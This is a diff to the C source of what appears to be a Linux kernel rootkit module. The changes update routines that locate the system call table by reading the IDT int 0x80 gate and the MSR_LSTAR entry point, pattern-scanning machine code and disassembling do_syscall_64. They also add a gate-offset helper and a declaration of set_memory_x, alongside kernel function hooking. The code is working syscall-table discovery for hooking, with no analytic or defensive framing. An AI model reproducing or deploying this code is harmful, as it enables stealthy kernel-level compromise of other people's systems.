@@ -47,11 +47,10 @@
  * 24/01/2018 - D1W0U
  */
 
+#include <linux/vmalloc.h>
 #include <asm/desc.h>
 #include <linux/net.h>
-#include <asm/cpu_entry_area.h>
 #include <asm/msr.h>
-#include <linux/set_memory.h>
 #include <linux/slab.h>
 #include <linux/namei.h>
 #include <linux/proc_fs.h>
@@ -105,6 +104,8 @@ void hook_kernel_funcs(void);
 //int set_memory_ro(unsigned long addr, int pages);
 //void *search_change_page_attr_set_clr(void *set_memory);
 void *search___vmalloc_node_range(void *__vmalloc);
+inline unsigned long my_gate_offset(const gate_desc *g);
+extern int set_memory_x(unsigned long addr, int numpages);
 
 /*
  * Global variables.
@@ -618,7 +619,7 @@ void *search_ia32sct_int80h(unsigned int **psct_addr) {
     store_idt(&idtr);
     pinfo("IDT address = %p, size = %d\n", idtr.address, idtr.size);
     idt = (gate_desc *) idtr.address;
-    ia32sct = (0xffffffffffffffff - (0 - (unsigned int)gate_offset(&idt[0x80])) + 1);
+    ia32sct = (0xffffffffffffffff - (0 - (unsigned int)my_gate_offset(&idt[0x80])) + 1);
     pinfo("int 0x80 handler address = %p\n", ia32sct);
 	//ia32sct = disass_search_inst_addr(ia32sct, "call", "%lx", 0x100, 2, (void **)psct_addr);
 	ia32sct = disass_search_inst_range_addr(ia32sct, "call", "%lx", 0x300, 1, 0x6f0000, 0xa10000, (void **)psct_addr);
@@ -639,27 +640,28 @@ void *search_sct_fastpath(unsigned int **psct_addr) {
 	// DO NOT call disassemble() in this function as sys_write is not yet imported!
 	// or import sys_write into f_sys_write before calling:
 	//*f_sys_write() = kallsyms_lookup_name("sys_write");
-	//disassemble(sct, 0x3c);
-	sct = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
-	if (memcmp(sct + 3 + 4, "\xff\xe7", 2) == 0) { // found!
+	//disassemble(sct, 0x100);
+	tmp = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
+	if (tmp != NULL && memcmp(tmp + 3 + 4, "\xff\xe7", 2) == 0) { // found!
+		sct = tmp;
 		sct += 3;
 		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1) + (2 + 1 + 0x31);
-		//disassemble(sct, 0x200);
-		tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "*-%x", 0x200, 1, (void **)psct_addr); // search for a direct call with offset
-		if (tmp == NULL) {
-			tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "-%x", 0x200, 1, (void **)psct_addr); // search for a mov with offset
-		}
-		if (tmp != NULL) {
-			sct = tmp;
-			sct = (void *) ((long) sct * -1);
-			return sct;
-		} else{
-			// can't write without sys_write() :(
-			perr("Sorry! call not found when searching sct in fastpath.\n");
-		}
 	} else {
-		// commented after leaving the use of kallsysm_lookup_name() :(
-		perr("Sorry! jmp address not found when searching sct in fastpath.\n");
+		pinfo("kernel version might be <= 4.11 on (search_sct_fastpath()).\n");
+	}
+
+	//disassemble(sct, 0x200);
+	tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "*-%x", 0x200, 1, (void **)psct_addr); // search for a direct call with offset
+	if (tmp == NULL) {
+		tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "-%x", 0x200, 1, (void **)psct_addr); // search for a mov with offset
+	}
+	if (tmp != NULL) {
+		sct = tmp;
+		sct = (void *) ((long) sct * -1);
+		return sct;
+	} else{
+		// can't write without sys_write() :(
+		perr("Sorry! call not found when searching sct in fastpath.\n");
 	}
 
 	return NULL;
@@ -669,52 +671,40 @@ void *search_sct_fastpath(unsigned int **psct_addr) {
 void *search_sct_slowpath(unsigned int **psct_addr) {
 	void *sct = (void *) __rdmsr(MSR_LSTAR);
 	void *tmp = NULL;
-	sct = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
-	if (memcmp(sct + 3 + 4, "\xff\xe7", 2) == 0) { // found!
+	tmp = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
+	if (tmp != NULL && memcmp(tmp + 3 + 4, "\xff\xe7", 2) == 0) { // found!
+		sct = tmp;
 		sct += 3;
 		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1);
-/*
-		tmp = disass_search_inst_addr(sct, "jne", "%lx", 0x100, 1, (void **)psct_addr);
-		if (tmp == NULL) {
-			tmp = disass_search_inst_addr(sct, "call", "%lx", 0x100, 1, (void **)psct_addr);
-		}
-		if (tmp != NULL) {
-			sct = tmp;
-			tmp = disass_search_inst_addr(sct, "call", "%lx", 0x100, 1, (void **)psct_addr);
-			if (tmp != NULL) {
-				sct = tmp;
-				tmp = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
-				if (tmp != NULL) {
-					sct = tmp;
-					sct = (void *)((long) sct * -1);
-					return sct;
-				}
-			} else {
-				perr("Sorry! call not found when searching sct in slowpath.\n");
-			}
-		} else {
-			perr("Sorry! jne address not found when searching sct in slowpath.\n");
-		}
+	} else {
+		pinfo("kernel version might be <= 4.11 on (search_sct_slowpath()).\n");
 	}
-*/
-
-		tmp = disass_search_inst_range_addr(sct, "call", "%lx", 0x300, 2, 0x6f0000, 0xa10000, (void **)psct_addr);
+	tmp = disass_search_inst_range_addr(sct, "call", "%lx", 0x300, 2, 0x6f0000, 0xa10000, (void **)psct_addr);
+	if (tmp != NULL) {
+		sct = tmp;
+		pinfo("do_syscall_64 at %p\n", sct);
+		tmp = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
 		if (tmp != NULL) {
 			sct = tmp;
-			pinfo("do_syscall_64 at %p\n", sct);
-			tmp = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
-			if (tmp != NULL) {
-				sct = tmp;
-				sct = (void *)((long) sct * -1);
-				return sct;
-			} else {
-				perr("Sorry, can't locate call with sys_call_table.\n");
-			}
+			sct = (void *)((long) sct * -1);
+			return sct;
 		} else {
-			perr("Sorry, can't locate do_syscall_64.\n");
+			perr("Sorry, can't locate call with sys_call_table.\n");
 		}
+	} else {
+		perr("Sorry, can't locate do_syscall_64.\n");
 	}
 	return NULL;
+}
+
+inline unsigned long my_gate_offset(const gate_desc *g)
+{
+#ifdef CONFIG_X86_64
+    return g->offset_low | ((unsigned long)g->offset_middle << 16) |
+        ((unsigned long) g->offset_high << 32);
+#else
+    return g->offset_low | ((unsigned long)g->offset_middle << 16);
+#endif
 }
 
 MODULE_LICENSE("GPL");
